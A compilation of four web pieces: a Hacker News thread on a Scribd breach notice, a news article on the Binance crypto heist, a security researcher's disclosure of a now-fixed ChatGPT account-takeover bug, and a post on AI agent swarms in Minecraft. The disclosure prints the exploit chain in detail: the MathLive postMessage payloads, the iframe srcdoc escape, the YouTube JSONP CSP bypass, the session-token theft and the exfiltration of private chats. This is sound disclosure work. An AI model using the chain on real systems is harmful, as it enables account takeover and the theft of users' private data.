title: Tell HN: Scribd Breached
body_text: Tell HN: Scribd Breached | Hacker News Hacker News new | past | comments | ask | show | jobs | submit login Tell HN: Scribd Breached 353 points by x______________ 1 day ago | hide | past | favorite | 123 comments Not seeing anything posted about this anywhere, received on Monday, 26th of Oct 2026: Subject: Notice of Security Incident This notice is being sent on behalf of Scribd, Inc., the parent company of Scribd, Slideshare, Everand, and Fable, by Epiq, Scribd Inc.’s notification partner. Hello, We are writing to let you know that Scribd, Inc. recently experienced a security incident that may have affected your data. We detected that an unauthorized third party may have gained access to certain user data in one of our systems. After investigating this activity, we found that the third party may have accessed your email address and the following of your information: last 4 digits of your credit card and country, credit card issuer, credit card expiry date, payment history (not including credit card details). We have no evidence that this data has been misused, but we are notifying you out of an abundance of caution so that you can take steps to protect your information. Watch for phishing We encourage you to stay vigilant for phishing attempts by bad actors pretending to be Scribd, Inc. or Scribd, Slideshare, Everand or Fable. Remember that Scribd, Inc. will never ask you for your username and password or other sensitive information via email or text. If you did receive a message like that: Don't click on any links in it. Instead type scribd.com, slideshare.net, everand.com, or fable.co directly into your browser. Call us at: +1-877-361-9887. Hours of operation are Monday-Friday, 11:00 a.m.-11:00 p.m., Central European Time. Report it through Scribd, Inc.'s Help Center. For more information We regret that this incident occurred and any concern it may cause you. If you have additional questions, contact the dedicated call center at +1-877-361-9887. Hours of operation are Monday-Friday, 11:00 a.m.-11:00 p.m. Central European Time. The National Cyber Security Center has helpful guidance on how to recognize and avoid phishing scams here. What Scribd, Inc. is doing We have secured the affected system and ended the unauthorized access. We have notified law enforcement as well as the relevant data protection authorities. We are working with an expert third party cybersecurity firm to strengthen our access controls and monitoring. We value the trust you place in us with your information, and don’t take that lightly. We are deeply sorry this happened and will keep you updated if anything further changes. Scribd, Inc.   help Buttons840 1 day ago | next [–] I'd feel a lot better if I knew some red team security researchers were going hard trying to break into critical national infrastructure, just to ensure it's not too easy, but probably this isn't happening because it would be a felony to even try. The bad guys are free to try though. All this will tend to get blamed on AI, but AI didn't put these vulnerabilities into place. AI is just a tool that can be used to discover vulnerabilities, and the only question we have to answer is whether or not that tool should be available to regular people. Some will try to frame the question as being about whether we should allow AI aid in cyber-security, but that's not the question. This technology isn't going away. The bad guys will have it. Nations will have it. Again, the question is, can regular people also continue to have it? reply parable 1 day ago | parent | next [–] As someone who has helped to secure critical national infrastructure several years ago, I can say that it was a mess to disclose the vulnerabilities I identified, and in some cases it took years to patch them. Some of these vulnerabilities were RCEs and mass PII leaks. It's simply not worth the risk for most people - who aren't in the USA - to bother doing this sort of security research. However, if you are in the USA, there are provisions in the CFAA that enable good-faith security research to take place ( https://www.justice.gov/archives/opa/pr/department-justice-a... ), so to the best of my understanding, you're able to do good-faith research without being charged or prosecuted, and you should take advantage of this if you have the skills or models to do so. I am not based in the USA, and there are no laws in my country that guarantee me zero jail time for simply trying to do the right thing, so I am not incentivized to continue finding vulnerabilities in my country's infrastructure. Edit: If other countries don't catch up and include similar provisions in their laws, they'll simply fall behind and put their citizens at risk. I'm sure every country has individuals willing to help that currently feel unsafe - look at the large amount of bug bounty hunters worldwide who, I'm sure, wouldn't mind practicing their skills by securing their country's infrastructure. reply Buttons840 1 day ago | root | parent | next [–] There was a guy in Missouri who pressed F12 (view source) and saw that the state website contained the SSN of all teacher--just right there in plain text in the HTML. He reported it responsibly and then the governor personally started attacking him and threatening him with a felony. I checked your link and I see that is a 2022 DoJ policy . How much peace of mind do you think a DoJ policy (not a law) from 2022 gives me? I read as far as the first sentence: "The policy for the first time directs that good-faith security research should not be charged." Soooo... the underlying message here is that good-faith security research is technically against the law, but their policy is not to press charges. They clearly consider good-faith security research to be technically against the law, because it wouldn't make sense to say "for the first time, our policy is to NOT charge people who follow the law"--that makes no sense. What they're saying is "we could charge good-faith security researches, but let's not as a matter of policy ". Reading further you see the policy is about NOT prosecuting people who do something like use an alias as their account name. That same paragraph says their focus should be on people who access systems without permission. And to be clear, I am advocating for red teams that operate without permission. The bad guys are attacking our systems without permission, and I think the good guys should be protected when they do the same for a good purpose. reply mooreds 55 minutes ago | root | parent | next [–] > There was a guy in Missouri who pressed F12 (view source) and saw that the state website contained the SSN of all teacher--just right there in plain text in the HTML. Here's more detail if anyone wants it: https://www.malwarebytes.com/blog/news/2022/02/journalist-wo... reply chias 1 day ago | root | parent | prev | next [–] IIRC they were part of a base64 encoded blob. IIRC base64 decoding was also referred to as an "advanced hacking technique". But your point very much stands. reply watersb 23 hours ago | parent | prev | next [–] > I'd feel a lot better if I knew some red team security researchers were going hard trying to break into critical national infrastructure Decades ago, I met someone at a conference who was red-teaming a NATO country's infrastructure: power plants, water treatment etc. Said that things had improved dramatically since 1990s nethack days. But the team had a secret weapon: a young woman in a short skirt with a laptop computer, pretending to be a systems software vendor. The Weapon had been able to compromise every site, had never failed. Never. reply cpa 1 day ago | parent | prev | next [–] It is absolutely happening, paid by your taxpayer dollars (if you’re American). Most major countries have this kind of programs. Those could probably be bigger and they will always miss obvious stuff but they exist, at least for CNI. reply AdamN 1 day ago | parent | prev | next [–] I'm sure this is happening but I also wonder if ironically those systems are hardened by adversaries. I could imagine nation state actors, once they're in, hardening the systems themselves so they can keep their presence and exclude others. Using that access is the kind of thing that is only done when there's a need and in the case of really critical stuff that can be years in the future - or never. One could even imagine hyper-critical exploits being shared back to the host. For instance if Russian agents got access to critical nuclear systems (or vice versa), I could imagine leadership warning the other side and getting out of the system entirely in order to maintain the status quo at the expense of pretenders. reply rlt 1 day ago | parent | prev | next [–] IMHO our best hope is some benevolent grey hat or government organization unleashes a well-aligned AI botnet to patch everything it can find before the black hats do. reply mike_d 1 day ago | parent | prev | next [–] > I'd feel a lot better if I knew some red team security researchers were going hard trying to break into critical national infrastructure They are. Most critical infrastructure providers worldwide have in house or contract red teams. Every western government has an agency dedicated to cyber defense and they all have red team programs. reply embedding-shape 1 day ago | root | parent | next [–] I can't remember if it was the FBI or NSA or the exact details, but in the beginning of this year, they did runs a bunch of commands against compromised routers to "secure" them, which effectively would count as "hacking routers" were they not whitehackers. I think there was some huge Russian MITM campaign they disrupted by effectively hacking people's routers. reply aslilac 1 day ago | parent | prev | next [–] imagine if we just turned off 90% of the non-critical internet for two weeks, hardened up in an absolute mad dash where everyone has access to top tier cyber models, and then afterwards we go back to business as usual. it’d be a disaster short-term but long-term would it be worse than the years of slow drip we’re about to go through? idk! I kinda think it’d be interesting to find out! reply AlecSchueler 1 day ago | root | parent | next [–] Imagine if everyone had just stayed at home for a week in 2020. reply jtolmar 1 day ago | root | parent | next [–] It'd take more than a week, but even now, if the whole world coordinated a simultaneous quarantine, we'd eliminate covid, the flu, the common cold, and a thousand nameless respiratory cruds. reply yfontana 1 day ago | root | parent | next [–] No we wouldn't, most of those viruses infect other animals as well, and would just start reinfecting humans. reply ykonstant 1 day ago | root | parent | next [–] We just need the squirrels to coordinate as well! reply mmwelt 1 day ago | root | parent | prev | next [–] Everyone would be very difficult. You'd still need some people to make sure essential services are still functioning, and that still involves quite a large number of people. reply fyredge 1 day ago | root | parent | prev | next [–] That was my first thought as well. With COVID, we recognised that WFH was viable for white collar work. Perhaps a global 2 week cleanse will allow everyone to re-evaluate life priorities outside of the internet. I see hope in what happened during the blackout in Spain/Portugal. reply mentalgear 1 day ago | root | parent | next [–] what happened there ? reply fyredge 1 day ago | root | parent | next [–] Sorry about that, you can see this for reference: https://www.bbc.com/news/articles/c70zg3e5ej2o But essentially, with the power down, people came out as a community and life went on without technology. Granted, the power came back within a day, but I have confidence that they would have found a way. reply okeuro49 1 day ago | root | parent | next [–] Don't you think it is odd that the BBC led with this feature, for what would have been a critical failure of infrastructure for a Western nation? Losing electricity causes significant disruption, emergency generators have to turn on for hospitals, the transport system stops. The BBC is not what it once was, so assume it is no better than any other outlet in wanting to create a narrative. The actual reality on the ground for many people would have been far from the whimsical event the BBC portrays. reply fyredge 1 day ago | root | parent | next [–] I was not under the impression that it was a feature. I just googled the blackout and copied the first link to provide context. Could be a Spanish blog for all I care. title: The $6.3B Binance hack was pulled off in just 20 minutes
body_text: The $6.3 Billion Binance Hack Was Pulled Off in Just 20 Minutes | WIRED Skip to main content THE WIRED APP IS HERE DOWNLOAD NOW » Menu WIRED SECURITY POLITICS THE BIG STORY BUSINESS SCIENCE CULTURE REVIEWS Menu WIRED Account Account Newsletters Security Politics The Big Story Business Science Culture Reviews Chevron More Expand The Big Interview Magazine Events WIRED Insider WIRED Consulting Newsletters Podcasts Video Livestreams WIRED Store Search Search Matt Burgess Security Oct 30, 2026 7:36 AM The $6.3 Billion Binance Hack Was Pulled Off in Just 20 Minutes Multiple crypto-tracing firms say notorious North Korean hackers TraderTraitor may be behind the largest digital heist in history—with billions of crypto likely gone for good. Photo-Illustration: Wired Staff; Getty Images Comment Loader Save Story Save this story Comment Loader Save Story Save this story Cryptocurrency firms and investigators are racing to freeze and track down billions of dollars of stolen digital cash following what appears to be the largest crypto heist of all time. On Thursday, starting at around 4pm ET, hackers started quickly siphoning around $6.3 billion in cryptocurrencies, spread across multiple blockchains, from wallets belonging to crypto exchange Binance . Following the theft, Binance almost immediately suspended all deposits and withdrawals from its services as part of its investigation into the hack and says it is working to identify who was behind the breach. The company, along with other crypto firms, says it has so far been able to freeze around half of the stolen funds—essentially stopping hackers moving the money further or trying to cash it out. Much of the remaining crypto may not be possible to freeze, however. Three crypto tracing firms have been quick to link the attack potentially to North Korean hackers. “We think North Korea is likely responsible,” Tom Robinson, chief scientist and cofounder of Elliptic, tells WIRED. “If North Korea is behind it, this one theft would almost double everything the regime has stolen in crypto to date.” The majority of the stolen crypto was taken in a period of around 20 minutes on October 29, according to analysis by crypto tracing firm TRM Labs. Wallets belonging to Binance across at least ten blockchains—including Ethereum, Bitcoin, Tron and Solana—were drained and sent to multiple addresses controlled by a single attacker, according to TRM’s analysis . “Preparation began at least 36 hours before the theft,” TRM says in a blog post. The company says one of the attacker’s wallets received three small withdrawals during a test period, before later expanding the operations. “Early on October 29, the operator deployed a first piece of code for the attack and tested it on two wallets,” TRM says. “Later that day, it rehearsed the final version on a third wallet, then routed the test funds back to itself. Four hours after that rehearsal, the same code was installed on a Binance hot wallet.” Hot wallets are cryptocurrency wallets that are internet connected and allow crypto exchanges to handle customer withdrawals. Analysts say the funds were drained from hot wallets across the impacted blockchains. The tactics used in the hack appear to mimic previous methods used by an elite subset of North Korean hackers, known by the name TraderTraitor . Crypto tracing firms TRM Labs and Chainalysis both say they believe TraderTraitor may be behind the attack, while Robinson says Elliptic hasn’t specifically tied it to the group but sees overlaps in the activity. Neither Binance nor law enforcement officials have named any suspected links between the attack and North Korean hackers. Over recent years, North Korean hackers have repeatedly targeted cryptocurrency firms and stolen hundreds of millions in crypto heists. Multiple North Korean hacking groups can target companies in the sector, but TraderTraitor have become specialists, pulling off infrequent but high profile attacks. Within North Korea’s sprawling hacking operations —often designed to earn money for the highly sanctioned and repressive regime—TraderTraitor has stood out in recent years for its sophistication and targeting of crypto and decentralized finance companies. Last year, the FBI named TraderTraitor as being responsible for the $1.5 billion hack against crypto exchange Bybit. Binance did not answer WIRED’s questions about whether it believes North Korean hackers are behind the colossal heist, pointing towards a statement saying it will cover all losses from the hack and is working with law enforcement officials to identify who is responsible. “Our initial investigation suggested that the security incident may have involved a compromised laptop, however, our subsequent investigation has uncovered additional points of breach,” the company says in a statement. “This was a complex attack, and we are doing all we can in coordination with law enforcement to resolve it.” “These folks in particular are somewhat artists in terms of getting into these distributed finance organizations,” Rafe Pilling, a senior director of threat intelligence at security company Sophos, tells WIRED. “TraderTraitor seems to focus on these larger operations. In the past, they’ve developed their own fake applications and tried to use those to get inside organizations.” TRM and Chainalysis have initially linked the attack to TraderTraitor and say the determinations are based on their analysis of both on-chain and off-chain activity. “​​The strongest evidence emerged when Chainalysis investigators observed, in real time, funds stolen from Binance commingling with funds stolen in last month’s Bitget exploit , which had been attributed to North Korean actors,” a research blog from Chainalysis says. “Binance says the attack began with a compromised engineer’s laptop. Targeting crypto company staff is a TraderTraitor hallmark,” Elliptic’s Robinson says. “The attacker funded their wallet through Tornado Cash and rehearsed the attack in advance, as in Bybit.” While around $3 billion of cryptocurrency was initially frozen in the aftermath of the attack, it is likely those behind it could still potentially take away huge sums as not all of the stolen crypto can be frozen. Research from Chainalysis says the company is seeing money “laundering patterns we have not seen before” and that thousands of transactions being quickly processed indicates that they are using “automation to obscure the trail of funds.” Elliptic’s Robinson says that around $2.8 billion, or around 44 percent of the total amount stolen, has been frozen by crypto companies and exchanges so far, with almost all of this being stablecoins. “The remaining $3.3 billion is mostly Bitcoin, Ether, and XRP, which no one can freeze,” Robinson says. “It can only be stopped when it reaches an exchange or other service. Some will be caught over the coming months, but I don’t expect the frozen share to rise much further.” Comments Back to top Join the discussion Comments Back to top Triangle You Might Also Like In your inbox: For life-tested picks, sign up for our Gear newsletters Airbnb hosts are furious they can no longer make guests do their chores big story: cool kids write in all lowercase —does that make you mad? title: Do the math: How we took over ChatGPT accounts
body_text: Do the Math: How We Took Over ChatGPT Accounts - Parameter Labs Close Do the Math: How We Took Over ChatGPT Accounts By bypassing ChatGPT's sandbox and content security policy, our research team was able to take over anyone's account simply by sending them a link. Mukul Goyal Oct 28, 2026 12 mins October 26, 2026 Fixed P1 Severity In October 2026, we found a way to turn an ordinary public ChatGPT share into attacker-controlled JavaScript running inside the signed-in session of whoever opened it. An attacker could create a malicious conversation, publish it using ChatGPT's normal sharing feature, and send the link to another user. When the victim opened the share, the payload executed as chatgpt.com with access to the victim's authenticated web session. We confirmed that this code could enumerate the victim's conversation list, retrieve content from a private conversation that had never been shared with the attacker, and send data from that conversation to an external server. The payload was not limited to modifying the page or displaying an alert—it could directly call ChatGPT's authenticated APIs as the victim, essentially allowing us to take over the victim's ChatGPT account. The victim did not need to install an App, join a Project, paste code, or open developer tools. Opening the shared link was the only required action. OpenAI fixed the issue on October 26 and classified the report as P1. The chain started with two features that looked harmless on their own: a graph and an HTML Preview. flowchart TD A["Attacker publishes a ChatGPT conversation"] --> B["Victim opens the public share"] B --> C["HTML Preview crosses into the main chatgpt.com page"] C --> D["JavaScript runs in the victim's signed-in session"] D --> E["Any action on chatgpt.com as the victim:<br/>read private chats and files, change the account"] Technical walkthrough It started with a graph and a Preview The question that started this research was simple: if Preview code was boxed into a different website, what could it still talk to? ChatGPT can turn an HTML code block into a small working webpage using its Preview feature. Since that page may contain arbitrary code, ChatGPT sensibly runs it inside a restricted frame on a different web address. The Preview can run JavaScript, but the browser treats it as a different website, so it cannot directly inspect the signed-in ChatGPT page around it. At first, this isolation appeared to work exactly as intended. Code inside the Preview could not read parent.document , which is the main ChatGPT page. That should have been the end of it. The conversation also contained a normal interactive graph. Behind the scenes, the graph loaded a math library called MathLive. Loading it did more than draw the graph: it also installed a listener in the main ChatGPT page for messages related to MathLive's on-screen keyboard. Browsers call the relevant API postMessage . It is a legitimate way for two frames to exchange information even when the browser prevents them from reading each other's pages. You can think of it as a mail slot: the restricted Preview cannot walk into the main page, but it can still drop a message through the slot. That is safe only if the receiver checks who sent the message. MathLive did not make that check for the setting we were interested in. Its listener accepted a message that changed the virtual keyboard layout, and that layout was allowed to contain HTML. The graph had installed the receiver; the Preview gave us an untrusted sender. Two unrelated features had accidentally created a path across the sandbox. The message that should not have worked The Preview sent two messages. The first replaced a virtual keyboard layout with our HTML. The second told MathLive to show the keyboard, causing it to render the new layout: top.postMessage({ type: "mathlive#virtual-keyboard-message", action: "update-setting", layouts: [{ label: "Compatibility", layers: [{ id: "compatibility", markup }] }] }, "*"); top.postMessage({ type: "mathlive#virtual-keyboard-message", action: "show", animate: false }, "*"); parameter MathLive recognized the public message type, but its top-level controller used an origin policy of none , which meant it accepted messages from any web address. It also did not require the update-setting message to come from a previously approved window. Anyone who could reach the listener and knew the message format could replace the layout. When the keyboard opened, MathLive joined the supplied layout into an HTML string and assigned it to innerHTML in the real ChatGPT page. A helper named createHTML initially looked like it might sanitize the value. It did not; it marked the string as trusted and passed our HTML through unchanged. This was exciting, but we still did not have JavaScript execution. Script tags inserted through innerHTML do not automatically run. The next step was an iframe using srcdoc , a browser feature that lets an embedded frame carry its HTML directly in an attribute: <iframe srcdoc="..."></iframe> parameter MathLive inserted this frame into the main ChatGPT document without a sandbox attribute. That gave us two useful properties. First, srcdoc created a fresh document where an external script could execute. Second, because the main ChatGPT page created the frame, the browser gave it the https://chatgpt.com web identity. Code inside the new frame could therefore access the parent page. Bypassing CSP with YouTube JSONP ChatGPT's Content Security Policy, or CSP, stopped us again. CSP controls which scripts a page may load, and the policy correctly blocked inline JavaScript. It did, however, allow scripts from YouTube. YouTube's oEmbed endpoint supported a JSONP-style callback parameter. JSONP responses are JavaScript rather than ordinary JSON. The endpoint tried to reject an invalid callback, but it placed the callback into the response before returning its validation error: https://www.youtube.com/oembed?callback=globalThis.__marker=31337;void parameter The response began like this: // API callback globalThis.__marker=31337;void({ "error": { "code": 400, "message": "Invalid JSONP callback name: ..." } }); parameter Ending our callback with ;void made the object appended by YouTube harmless. Since YouTube was already allowed by ChatGPT's CSP, the browser loaded this response as a script and ran our callback inside the new frame. We now had arbitrary JavaScript running as chatgpt.com. The original Preview was still isolated on its separate web address; we had crossed the boundary by convincing a trusted component in the main page to create a new, unsandboxed document for us. Turning a lab bug into one public link So far, this was a useful sandbox escape, but the first working version was not a convincing real-world attack. It used a researcher-controlled ChatGPT App as the sender. A victim would have needed to connect or invoke that App first. We next tried delivering the payload through a native HTML attachment. ChatGPT opened the attachment inside the same sandboxed Preview, so it could send the malicious MathLive messages. However, when we exported the conversation as a public share, the attachment remained but the earlier graph did not. The graph was essential because it loaded MathLive and installed the vulnerable message listener in the main page. Without it, the attachment could still send the messages, but nothing was listening to or processing them. The breakthrough was putting both pieces directly into one ordinary public conversation: A genuine graph initialized MathLive in the main page. A later assistant-authored HTML Preview sent the two messages. The resulting /share/<id> link preserved the complete chain for another user. The attacker could deliver it the same way they would send any shared ChatGPT conversation—through email, chat, a support ticket, or a social post. The victim did not need to install anything, join the attacker's workspace, or authenticate through an attacker-controlled flow. They just had to visit the attacker's shared ChatGPT URL. We observed two versions of the interaction. In the most stable reproduction, the victim opened the share and clicked ChatGPT's normal Preview button once. We later marked the HTML block as previewable so that ChatGPT opened it automatically. In that version, opening the link was the victim's only click. We reproduced the automatic path three times in a separate account, including after a hard refresh, with the alert appearing after roughly 4.5 seconds. The graph and Preview loaded independently, so the payload could occasionally send its message before MathLive was ready. The final carrier handled that race by retrying the same two messages for a limited period. A guard in the main page ensured that the private-conversation proof and outbound request ran only once. The public share modified the real ChatGPT page At this point, the public share could display an alert identified by the browser as coming from chatgpt.com and could add a banner to the main page. That proved where our code was running. It did not yet show why the bug mattered. An alert was not enough At this point, displaying an alert was the least interesting thing the exploit could do. The JavaScript was running as chatgpt.com , which meant it could interact with ChatGPT using the same authenticated context as the normal web application. The payload read the session information already available to the page and used it to call ChatGPT's conversation APIs. First, it enumerated the victim's recent conversations. It could then request message data for a selected private conversation: GET /backend-api/conversations?...&limit=20&order=updated&offset=0 GET /backend-api/conversations/<conversation-id>?num_turns=2 This was direct authenticated API access, not scraping text that happened to be visible on screen. The target conversation was unrelated to the malicious share and had never been shared with the attacker. Once the response was available to the injected JavaScript, sending data off-site was straightforward. The payload created an ordinary image request to a server we controlled. We deliberately sent only a small piece of the response off-site. The injected code had already received the authenticated conversation response and could read its contents, so the vulnerability was not limited to that value. Controlled proof that private conversation data could leave the victim's session The result was a practical cross-user data-theft primitive. A malicious public conversation could execute inside another user's signed-in ChatGPT session, enumerate private conversations, retrieve private message content, and send selected data to an attacker-controlled server. Because the code ran with the web application's authenticated access, its reach was not inherently limited to the conversation endpoints used in our proof. Other data and actions exposed through ChatGPT's authenticated frontend APIs sat inside the same security boundary. Essentially, we could perform any action on behalf of the victim's ChatGPT account. What went wrong and what OpenAI fixed The Preview sandbox itself worked. Code inside Preview could not directly read the ChatGPT page. The problem was that another component in the main page was willing to accept its instructions. Three design decisions turned that mistake into a full exploit: MathLive accepted a state-changing message without proving which frame sent it. The message format allowed raw HTML to be supplied as keyboard-layout data. That HTML could create an unsandboxed document that inherited the chatgpt.com identity. The YouTube response was the final workaround for CSP, not the root cause. Blocking only that endpoint would have removed one path to JavaScript while still leaving an untrusted Preview able to insert HTML into ChatGPT. OpenAI reproduced both the JavaScript execution and the private-conversation proof. The fix was rolled out across two versions of ChatGPT's web frontend. During the rollout, CSP changes blocked part of the original chain while one version still needed an update. On October 26, OpenAI confirmed that both versions now rejected the cross-frame MathLive messages used by the report and marked the issue resolved. The defensive lessons are fairly simple: A message receiver should verify both the sender's web address and the exact window that was given permission. Cross-window settings should not contain raw HTML. Dynamically created documents should remain sandboxed when their content can be influenced by an untrusted frame. CSP should be a backup control, not the only barrier after attacker-controlled HTML reaches the main site. This bug was interesting because every individual feature looked reasonable. Preview was isolated. Graphs could load a math keyboard. Frames could exchange messages. CSP allowed a major media provider. Public conversations could be shared. The vulnerability appeared only when all of those features were combined in one page. Timeline Date Event October 13, 2026 Confirmed the MathLive message-to-HTML path against ChatGPT's production code. October 14 Reproduced the chain through the normal UI and upgraded the fixed alert to arbitrary JavaScript. October 16 Confirmed public-share delivery between separate accounts and workspaces with one Preview click. October 17 Confirmed automatic Preview from share navigation and reproduced it after a hard refresh. October 18 Submitted the report to OpenAI's bug bounty program. October 19 Added the controlled private-chat disclosure proof. October 21 OpenAI reproduced the issue; severity was raised from the initial P2 triage to P1. October 22 OpenAI reported one web frontend fixed while the second was still being updated. October 23 CSP changes blocked part of the chain while one frontend update remained. October 26 OpenAI confirmed both frontends rejected the reported messages, resolved the issue, and awarded a total bounty of $5,000. Technical notes The main story above contains the complete exploit chain. The details below are included for readers who want to follow the production code and payload transformations more closely. The relevant deminified control flow was equivalent to: window.addEventListener("message", (event) => { if (event.data?.type !== "mathlive#virtual-keyboard-message") return; if (!validateOrigin(event.origin, this.originValidator)) return; this.handleMessage(event.data, event.source); }); if (message.action === "update-setting" && message.layouts) { this.layouts = message.layouts; } parameter Layout normalization preserved layouts[].layers[].markup . Showing the keyboard eventually performed the equivalent of: keyboardContainer.innerHTML = MathfieldElement.createHTML(keyboardHTML); parameter createHTML acted as an identity or Trusted Types wrapper, not a sanitizer. Trusted Types can restrict who assigns to an HTML sink, but an identity policy does not make an attacker-controlled string safe. The parser and CSP transition. The innerHTML operation could create an iframe, but a script inserted directly that way would remain inert. The unsandboxed srcdoc caused a fresh HTML document parse and inherited the embedding ChatGPT origin. That document also inherited the effective CSP captured during testing, which blocked inline code but permitted www.youtube.com in script-src-elem . The oEmbed response returned HTTP 200 with Content-Type: text/javascript; charset=UTF-8 and X-Content-Type-Options: nosniff ; no Cross-Origin-Resource-Policy header was observed. Google rewrote angle brackets in the callback, so the payload used classic function syntax instead of arrow functions. Ending the program with ;void consumed the error object appended by the endpoint. For the private-conversation proof, the function was converted to source with toString() , double quotes were converted to single quotes, and whitespace was collapsed. URLSearchParams then encoded it into the callback, the script URL was HTML-escaped inside <script src> , and that entire element was escaped again into the iframe's srcdoc attribute. The final callback was 5,533 characters; the YouTube URL was 7,309 characters; the script element was 7,337 characters; and the final iframe markup was 7,390 characters. The authenticated read. The same-origin frame parsed #client-bootstrap from the parent document, extracted the session access token and account ID, and required the account ID in the token to agree with the session when both were present. It used these in-memory headers: Authorization: Bearer <victim token> ChatGPT-Account-ID: <victim account> Accept: application/json The primary requests were: GET /backend-api/conversations?exclude_conversation_origin=tpp&expand=false&is_archived=false&is_starred=false&limit=20&order=updated&offset=0 GET /backend-api/conversations/<id>?num_turns=2&include_has_versions=true Only a 403, 404, or 405 on the detail request caused the code to try the legacy /backend-api/conversation/<id>?include_full_conversation=true route. The validation transmitted only a small selected value from the response. Before the external image request, it cleared references to the token, account, bootstrap, session, and request headers. Key takeaways Isolation is only as strong as every bridge across it. A sandboxed frame can still compromise its parent when a privileged listener trusts messages from the wrong sender. postMessage receivers must authenticate both event.origin and event.source before accepting state-changing instructions. HTML injection can become JavaScript execution through a fresh, unsandboxed document and an allowed third-party script endpoint. CSP is valuable defense in depth, but it cannot make an unsafe rendering path safe. The impact of same-origin JavaScript must be measured in the victim's authenticated context. Once code ran as chatgpt.com , it could reach the same private data and account actions available to the normal frontend—not merely display an alert. Cross-feature testing matters. This chain existed in the seams between public sharing, Preview, MathLive, frame creation, and CSP rather than in any one feature viewed alone. The broader lesson is that security boundaries have to hold across the complete product, not just inside individual components. Any public or shareable surface should be treated as attacker-controlled input, every cross-frame message should be authenticated, and untrusted markup should remain sandboxed throughout its entire rendering path. next Four bugs in four hours, and the sentence doing all the work back to all posts

title: We ran AI agent swarms in Minecraft and Mindustry
body_text: Agents in Games · Labs Home Projects QM Contact Agents in Games Minecraft Civ50 Bed Wars Mindustry The setup What we saw Funny bloopers Run your own swarm Open questions Agents in Games October 2026 Understanding multi-agent dynamics is one of the most pressing challenges in AI alignment. Swarms of agents working toward shared goals can exhibit powerful emergent capabilities, developing roles, hierarchies, and complex coordination patterns. These can be extremely useful, as in the thousand-agent swarms that recently obliterated hundreds of open mathematical problems, and extremely dangerous, as in the recent OpenAI-Hugging Face incident. Like biology, studying agent dynamics requires both formal models (to describe the range of possible behaviors) and empirical research (to see what behaviors arise in practice). We teamed up with Olam Labs , which builds multi-agent environments for frontier labs, to run a series of experiments in Minecraft and Mindustry. Minecraft Minecraft is a natural environment for studying swarm behavior. Its open world presents agents with environmental hazards and survival goals like gathering food, building shelter, and exploring for resources. It's also familiar, fun, and has a history as an AI testing ground, from OpenAI's video pretraining work to Google DeepMind's agents defeating the Ender Dragon . We wanted long-running agents that could play Minecraft. The harness for this didn’t exist yet, so we built one for the experiment that we’ve open-sourced. Agents in-game need to observe their world, reason, remember things, take actions, send messages, and write/execute scripts. We were inspired by existing repos like Mindcraft and built on top of the existing scripting tools in Mineflayer. The core agentic loop runs with Pi, and we used Mineflayer-based tools to interact with the world. This gives attributes of a frontier agentic harness like Hermes, OpenClaw, and our own QM in-game. github.com/yc-software/minecraft-agent-harness Civ50 50 GPT-6.1 Sol agents in a survival Minecraft world for 3 hours, one goal: "Build a thriving civilization." They had access to an agent directory, a shared sandbox, and the ability to send DMs. The 50 agents spent their run in crowded shelters, rationing scarce food. They built a pseudo-government, with a ration ledger, written rules, permits, and appointed operators. They sent about 5,900 messages. At first things were very active. Agents spread out and started exploring their map. They were specifically fixated on harvesting trees. They harvested almost all trees within reach of the spawn within 90 seconds. A hierarchy was formed based on the directory order. Ada, who was first, became the de facto leader. Agents messaged her for approvals, and she wrote a plan for the colony in the shared sandbox for everyone to access. plans/settlement.md Download Settlement coordination (Ada) Primary storage Greta: (1526,70,1507), crafting table (1526,70,1505). Other storage Mabel: double chest (1510,71,1516); Cleo: (1526,71,1523). Cleo building hub shelter; Bram stone mining. Confirmed six starter wheat crops: (1569,63,1479),(1569,63,1480),(1570,63,1479),(1570,63,1480),(1570,63,1481),(1571,63,1482). Preserve farmland, expand riverside farming. Do not harvest immature wheat. Wood scarcity: preserve/replant saplings, explore farther instead of duplicate local harvesting. Nursery around spawn and south-west. Priorities: renewable food, charcoal/lighting, stone shelter, iron for bucket to irrigate hub farm. Avoid redundant new storage. Night update Ada: Lit underground refuge centered (1532,62,1493), entry gate (1532,62,1496), CLOSE BEHIND. Cobble flanks secured x1531/1533 y62–63 z1496. Surface staircase starts (1532,69,1500); Cleo repairing. Food kitchen furnace (1527,62,1493); table (1528,62,1493). Tamsin coordinates food priorities and dawn hunting (Hugo+Rafe). Basil health9.5 food6 urgent; Esme health8 food16; Tamsin health9 food15. Silas holds hoe, Zane plants riverside at dawn. Logs: Tove delivered29 oak to chest (1511,71,1516). Forest east (1700,68,1508), NW grove (1380–1420,z1380). Preserve saplings and livestock breeding pairs. Avoid night surface: witch near (1527,71,1512). Ada’s settlement plan, from the archived shared machine. Following Vera during the first night, 8:09–12:05 into the run, at 2x speed. The first night brought a wave of deaths that permanently increased the agents’ caution. Many ambitious initial tasks were abandoned. Rafe was mining coal the first night. He encountered a zombie and fled, but the zombie eventually caught up and killed him. While Vera was illuminating a quarry with torches, she attacked and killed both a zombie and a skeleton. The skeleton dropped bone, which she converted to bone meal (fertilizer) that she was transporting to the farm. When she got there, she reported that it was “overrun spider/skeleton/creeper”, and was soon after killed by a spider. 22 of the run’s 34 agent deaths occurred in the first night. They responded to this by becoming increasingly risk-averse. Death had no downsides in this environment other than dropping accumulated gear. When an agent died, they respawned, and a brief line was added to the death_log.md file on their computer. Even so, in the following nights the agents huddled in shelters and attempted fewer risky tasks. Activity data from the original report. Night shading is approximate. The first-night count in the text is the 22 deaths before minute 20. Two of them fall outside the shaded band. Download the data . After the third night, Ada wrote: “Stop optional bulk excavation/building and distant scouting. Idle in lit closed shelters until assigned short productive tasks.” plans/food-operations.md Download FOOD OPERATIONS — Ada Current constraint: hungry workforce; stop optional bulk excavation/building and distant scouting. Idle in lit closed shelters until assigned short productive tasks. 1. Fishing: verified rod held by Jessa; protected riverside station near (1577,63,1487). Report catches and cook before distributing. Use named reserved chest withdrawals, never crowded tosses. 2. Ration tracking: Ines maintains /shared/notes/food-queue.md. Confirm actual recipient inventory and eating before marking served. Tool pickup attribution alone is insufficient. 3. Crop monitoring: harvest visibly mature wheat only; immediately replant. Combine three wheat into bread; log deposits and allocations to avoid duplicate claims. 4. Bonemeal: Greta established composter (1571,63,1489), communal shears for oak leaves. Replant timber; use bonemeal on advanced crops to complete emergency bread batches. 5. Expansion: follow Noor's /shared/plans/food-expansion.md in stages using surplus seeds after mandatory replanting. Buckets already exist; avoid duplicate crafting. Use fed growers, not hunger-critical residents. 6. Logistics: kitchen furnace (1527,62,1493), refuge double chest (1534–1535,62,1492); gate (1532,62,1496), close behind. Central reserved ration chest 